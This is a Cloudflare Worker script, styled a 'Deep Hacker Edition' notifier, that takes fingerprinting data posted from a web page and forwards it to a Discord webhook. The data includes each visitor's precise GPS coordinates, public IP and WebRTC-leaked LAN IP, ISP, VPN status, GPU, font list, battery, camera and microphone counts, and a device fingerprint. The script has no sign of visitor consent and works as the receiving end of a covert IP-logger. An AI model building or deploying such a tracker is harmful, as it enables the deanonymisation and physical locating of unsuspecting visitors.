/**
Cloudflare Worker — Isekai Discord Notifier (Deep Hacker Edition)
Rate limiting via KV (10 req/jam per IP)
Discord embed dengan Deep Fingerprinting & Hardware Teardown
*/
const CORS_HEADERS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

function s(v, max = 200) {
  if (v == null || v === "" || v === "null") return "—";
  return String(v).replace(/[\x00-\x1F\x7F]/g, " ").slice(0, max);
}

function waktuWIB() {
  try {
    return new Date().toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      day: "2-digit", month: "long", year: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit",
    }) + " WIB";
  } catch (_) { return new Date().toISOString(); }
}

async function checkRateLimit(env, ip) {
  if (!env.RATE_LIMIT) return true; 
  const key = `rl:${ip}`;
  const LIMIT = 10;
  const TTL = 3600;
  try {
    const raw = await env.RATE_LIMIT.get(key);
    const data = raw ? JSON.parse(raw) : { count: 0 };
    if (data.count >= LIMIT) return false;
    await env.RATE_LIMIT.put(key, JSON.stringify({ count: data.count + 1 }), { expirationTtl: TTL });
    return true;
  } catch (_) { return true; }
}

function buildEmbed(data, request) {
  const getH = (name) => request.headers.get(name) || "";

  // GPS
  let gpsValue = "—";
  const lat = parseFloat(data.gpsLat), lon = parseFloat(data.gpsLon), acc = parseInt(data.gpsAcc, 10);
  if (!isNaN(lat) && !isNaN(lon)) {
    gpsValue = `[${lat.toFixed(5)}, ${lon.toFixed(5)}](https://maps.google.com/?q=${lat},${lon})`;
    if (!isNaN(acc)) gpsValue += `\n🔹 Acc: \`${acc}m\``;
    if (data.gpsAlt) gpsValue += ` | Alt: \`${data.gpsAlt}m\``;
  }

  // Baterai
  let battValue = "—";
  if (data.battLevel != null) {
    battValue = `${data.battLevel}% ${data.battCharging ? "⚡" : "🔋"}`;
    if (data.battChargingTime && data.battChargingTime !== Infinity) battValue += ` | Full: \`${Math.round(data.battChargingTime/60)}m\``;
    if (data.battDischargingTime && data.battDischargingTime !== Infinity) battValue += ` | Empty: \`${Math.round(data.battDischargingTime/60)}m\``;
  }

  // Koneksi
  let netValue = "—";
  if (data.netType) {
    netValue = `\`${data.netType.toUpperCase()}\` | \`${data.netDownlink}Mbps\` | RTT: \`${data.netRTT}ms\``;
    if (data.netSaveData) netValue += " | DataSaver";
  }

  // Hardware Deep
  const ramVal = data.ram ? `${data.ram} GB` : "—";
  const cpuVal = data.cpu ? `${data.cpu} Threads` : "—";
  
  let storageVal = "—";
  if (data.storageQuota) {
    storageVal = `Quota: \`${data.storageQuota}MB\``;
    if (data.storageUsage) storageVal += `\n🔹 Used: \`${data.storageUsage}MB\``;
  }
  
  let heapVal = "—";
  if (data.jsHeapLimit) {
    heapVal = `Limit: \`${data.jsHeapLimit}MB\``;
    if (data.jsHeapUsed) heapVal += `\n🔹 Active: \`${data.jsHeapUsed}MB\``;
  }

  // GPU
  let gpuVal = "—";
  if (data.gpuVendor || data.gpuRenderer) {
    gpuVal = `\`${s(data.gpuVendor, 30)}\``;
    if (data.gpuRenderer) gpuVal += `\n🔹 \`${s(data.gpuRenderer, 60)}\``;
  }

  // Peripherals
  let periVal = "—";
  if (data.mics !== undefined || data.cams !== undefined) {
    periVal = `🎤 \`${data.mics || 0}\` Mics | 📷 \`${data.cams || 0}\` Cams`;
  }

  // Fonts
  let fontVal = "—";
  if (data.fontsDetected) {
    fontVal = `Detected: \`${data.fontsDetected}\` fonts`;
    if (data.fontsList) fontVal += `\n \`${s(data.fontsList, 80)}\``;
  }

  // VPN
  let vpnValue = "—";
  if (data.isProxy === true || data.isHosting === true) {
    const tags = [];
    if (data.isProxy) tags.push("Proxy/VPN");
    if (data.isHosting) tags.push("Datacenter");
    vpnValue = `⚠️ \`${tags.join(" | ")}\``;
  } else if (data.isProxy === false) {
    vpnValue = "✅ Clean";
  }

  // Fingerprint & WebRTC
  const fpValue = s(data.fp || " ", 16) || "—";
  let fpVal = `\`${fpValue}\``;
  const localIP = s(data.webrtcLocalIP, 45);
  if (localIP && localIP !== "—") fpVal += `\n🔹 LAN: \`${localIP}\``;

  // Network Identity
  const publicIP = s(data.ip, 45);
  let ipVal = `\`${publicIP}\``;
  const cfRay = getH('CF-Ray');
  if (cfRay) ipVal += `\n CF-Ray: \`${cfRay.slice(0, 20)}\``;

  const isp = s(data.isp);
  let ispVal = isp;
  if (data.asn) ispVal += `\n🔹 AS: \`${data.asn}\``;

  const loc = s(data.lokasi);
  let locVal = loc;
  if (data.city) locVal += `\n🔹 ${s(data.city, 30)}`;

  // Device
  const plat = s(data.platform, 60);
  let platVal = plat;
  const osVer = getH('Sec-CH-UA-Platform-Version');
  if (osVer) platVal += `\n🔹 OS Ver: \`${osVer}\``;

  const res = `${s(data.screenW,8)}×${s(data.screenH,8)}`;
  let resVal = `${res} (\`${data.pixelRatio}x\`)`;
  if (data.colorDepth) resVal += ` | \`${data.colorDepth}-bit\``;

  const ua = s(data.userAgent, 180);
  let uaVal = `\`\`\`${ua}\`\`\``;

  const fields = [
    { name: "🌐 IP / Node", value: ipVal.slice(0, 1024), inline: true },
    { name: "🏢 ISP / ASN", value: ispVal.slice(0, 1024), inline: true },
    { name: "🕵️ VPN / Proxy", value: vpnValue.slice(0, 1024), inline: true },
    { name: "📍 Lokasi (IP)", value: locVal.slice(0, 1024), inline: true },
    { name: "🕐 Timezone", value: `\`${s(data.timezone, 30)}\` (${data.timezoneOffset})`, inline: true },
    { name: "📡 GPS Tepat", value: gpsValue.slice(0, 1024), inline: true },
    { name: "💻 Platform / OS", value: platVal.slice(0, 1024), inline: true },
    { name: "🖥️ Display", value: resVal.slice(0, 1024), inline: true },
    { name: "🎮 GPU (Hardware)", value: gpuVal.slice(0, 1024), inline: true },
    { name: "🧠 RAM / CPU", value: `${ramVal} | ${cpuVal}`.slice(0, 1024), inline: true },
    { name: "💾 Storage Quota", value: storageVal.slice(0, 1024), inline: true },
    { name: "⚙️ JS Heap Mem", value: heapVal.slice(0, 1024), inline: true },
    { name: "🎤 Peripherals", value: periVal.slice(0, 1024), inline: true },
    { name: "🔤 Font Fingerprint", value: fontVal.slice(0, 1024), inline: true },
    { name: "🌍 Bahasa", value: `\`${s(data.language, 10)}\` (${data.languages?.length || 0} langs)`, inline: true },
    { name: " Network", value: netValue.slice(0, 1024), inline: true },
    { name: "🔋 Battery", value: battValue.slice(0, 1024), inline: true },
    { name: "🔂 Fingerprint", value: fpVal.slice(0, 1024), inline: true },
    { name: "🔗 URL", value: s(data.url, 512), inline: false },
    { name: "📱 User Agent", value: uaVal.slice(0, 1024), inline: false },
  ];

  if (data.referrer) {
    fields.splice(fields.length - 1, 0, { name: "️ Referrer", value: s(data.referrer, 300), inline: false });
  }

  return {
    color: 0xFF6FB0,
    author: { name: " Pengunjung Tersesat Terdeteksi! [DEEP SCAN]" },
    fields,
    footer: { text: `Isekai Guild 🎴 • ${waktuWIB()}` },
  };
}

export default {
  async fetch(request, env) {
    if (request.method === "OPTIONS") return new Response(null, { status: 204, headers: CORS_HEADERS });
    if (request.method !== "POST") return new Response("Method Not Allowed", { status: 405, headers: CORS_HEADERS });
    
    const ct = request.headers.get("Content-Type") || "";
    if (!ct.includes("application/json")) return new Response("Bad Request", { status: 400, headers: CORS_HEADERS });
    
    let data;
    try { data = await request.json(); }
    catch { return new Response("Invalid JSON", { status: 400, headers: CORS_HEADERS }); }
    
    const clientIp = request.headers.get("CF-Connecting-IP") || s(data.ip, 45) || "unknown";
    if (!(await checkRateLimit(env, clientIp))) return new Response("Too Many Requests", { status: 429, headers: CORS_HEADERS });
    
    const webhookUrl = env.DISCORD_WEBHOOK_URL;
    if (!webhookUrl) return new Response("OK (no webhook)", { status: 200, headers: CORS_HEADERS });
    
    try {
      const res = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: "Isekai Guild 🎴", embeds: [buildEmbed(data, request)] }),
      });
      if (!res.ok) console.error("Discord error:", res.status);
    } catch (err) { console.error("Fetch error:", err); }
    
    return new Response("OK", { status: 200, headers: CORS_HEADERS });
  },
};
